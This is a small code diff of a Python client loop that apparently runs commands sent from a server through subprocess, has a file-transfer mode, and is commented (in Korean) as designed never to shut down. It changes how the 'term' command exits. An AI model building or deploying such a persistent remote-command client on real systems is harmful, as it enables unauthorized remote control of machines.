@@ -132,7 +132,7 @@ while True:
                     if(file_transfer_mode(conn)==0):
                         continue
                 elif(server_cmd[:4]=="term"):
-                    exit()
+                    os._exit(0)
                 else:
                     # no special command Handler
                     output=subprocess.getoutput(server_cmd)
@@ -146,6 +146,3 @@ while True:
     except Exception as e:
         debug_print(e)
         pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
-        
-
-
